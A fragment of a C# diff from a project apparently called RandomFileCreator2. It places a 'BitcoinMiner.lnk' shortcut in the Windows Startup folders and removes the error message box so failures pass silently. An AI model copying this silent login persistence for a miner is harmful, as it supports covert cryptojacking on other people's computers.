@@ -38,9 +38,8 @@ namespace RandomFileCreator2
                     Run();
                 CreateShortcut(startUp);
             }
-            catch (Exception e)
+            catch (Exception)
             {
-                MessageBox.Show(e.Message);
                 try
                 {
                     string userStartUp = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\BitcoinMiner.lnk";
@@ -48,7 +47,7 @@ namespace RandomFileCreator2
                         Run();
                     CreateShortcut(userStartUp);
                 }
-                catch (Exception ex) { }
+                catch (Exception) { }
             }
 
             Run();
